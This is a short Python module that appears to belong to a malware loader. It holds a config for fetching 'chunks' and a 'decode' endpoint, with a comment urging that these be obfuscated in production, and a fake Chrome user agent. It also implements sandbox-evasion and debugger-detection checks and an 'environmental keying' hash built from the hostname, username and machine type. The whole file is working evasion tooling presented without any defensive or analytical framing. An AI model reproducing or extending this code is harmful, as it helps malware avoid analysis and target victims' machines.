import platform
import hashlib
import os
import ctypes

class Config:
    # In production, these should be obfuscated or dynamically resolved
    BASE_URL = "http://localhost:8000" 
    API_CHUNKS = "/api/chunks"
    API_DECODE = "/api/decode"
    
    # Fake User Agent mimicking Chrome on Windows
    USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    @staticmethod
    def check_safety():
        """Performs Anti-Analysis checks. Returns True if safe to proceed."""
        import sys
        import time
        
        # 1. Uptime Check (Sandbox often has low uptime)
        try:
            # On Windows, tick count is milliseconds
            if "win" in sys.platform:
                 # Check if uptime < 10 minutes (600000 ms)
                if ctypes.windll.kernel32.GetTickCount64() < 600000:
                    return False
        except: pass

        # 2. Virtualization Check (Basic)
        # (Omitted common MAC/Registry checks to stay standard-lib only)
        
        # 3. Debugger Check
        if sys.gettrace() is not None:
            return False
            
        return True

def get_env_hash():
    """Generates a hash based on the environment (Environmental Keying)."""
    # Combine hostname + username + machine type
    data = platform.node() + os.getlogin() + platform.machine()
    return hashlib.sha256(data.encode()).hexdigest()
